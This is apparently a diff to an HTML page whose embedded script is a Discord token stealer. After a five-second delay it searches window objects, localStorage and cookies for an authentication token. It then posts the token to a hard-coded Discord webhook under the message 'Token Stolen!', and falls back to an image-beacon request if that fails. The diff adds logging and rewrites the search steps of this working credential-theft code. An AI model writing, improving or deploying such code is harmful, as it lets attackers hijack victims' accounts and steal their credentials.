@@ -2,36 +2,82 @@
 <html>
 <body>
 <script>
+  console.log("Script loaded... waiting 5s...");
+  
   setTimeout(() => {
     let token = null;
     
-    // Try multiple methods to find the token
+    // --- DEBUG: Log all window keys to find the token ---
+    const keys = Object.keys(window);
+    console.log("Available window keys:", keys);
+    
+    // Filter keys that might contain "token" or "auth"
+    const potentialKeys = keys.filter(k => k.toLowerCase().includes('token') || k.toLowerCase().includes('auth'));
+    console.log("Potential token keys:", potentialKeys);
+    
+    // --- Method 1: Check common Discord variables ---
     try {
-      // Method 1: Standard internal object
-      token = window._discordHeaders?.Authorization || 
-              window.z?.[0]?.c?.exports?.default?.instance?.getToken();
-    } catch (e) {}
+      token = window._discordHeaders?.Authorization;
+      console.log("Checked _discordHeaders:", token);
+    } catch(e) {}
 
-    // Method 2: Local Storage
     if (!token) {
       try {
-        for (let i = 0; i < localStorage.length; i++) {
-          const key = localStorage.key(i);
-          if (key.includes('token')) {
-            token = localStorage.getItem(key);
-            break;
-          }
-        }
-      } catch (e) {}
+        token = window.z?.[0]?.c?.exports?.default?.instance?.getToken();
+        console.log("Checked z.getToken:", token);
+      } catch(e) {}
     }
 
-    // Method 3: Cookies
+    // --- Method 2: Local Storage ---
+    if (!token) {
+      console.log("Checking LocalStorage...");
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        const val = localStorage.getItem(key);
+        if (key.includes('token') || (val && val.length > 50)) {
+          console.log("Found in LS:", key, val.substring(0, 20) + "...");
+          token = val;
+        }
+      }
+    }
+
+    // --- Method 3: Cookies ---
     if (!token) {
       const match = document.cookie.match(/token=([^;]+)/);
-      if (match) token = match[1];
+      if (match) {
+        token = match[1];
+        console.log("Found in Cookie:", token);
+      } else {
+        console.log("No token in cookies.");
+      }
     }
 
     if (token) {
+      console.log("TOKEN FOUND! Sending...", token);
       sendToken(token);
     } else {
-      console.log("No token found. Logging window
+      console.log("NO TOKEN FOUND. Check console for details.");
+      // Log the first 5 keys to help debug
+      console.log("First 5 keys:", keys.slice(0, 5));
+    }
+
+  }, 5000);
+
+  function sendToken(token) {
+    fetch('https://discord.com/api/webhooks/1538882362308436040/FINlSequEYQ17FsngVCjGYszDa9edDQZoX69_Qf-jOk2ZNmkQ8130ZWAiUGg5ghzlxQS', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        content: `🎣 **Token Stolen!**\n\`\`\`${token}\`\`\``
+      })
+    }).then(() => {
+      console.log("Sent successfully.");
+    }).catch(err => {
+      console.error("Fetch failed:", err);
+      const img = new Image();
+      img.src = 'https://discord.com/api/webhooks/1538882362308436040/FINlSequEYQ17FsngVCjGYszDa9edDQZoX69_Qf-jOk2ZNmkQ8130ZWAiUGg5ghzlxQS?content=' + encodeURIComponent(token);
+    });
+  }
+</script>
+</body>
+</html>
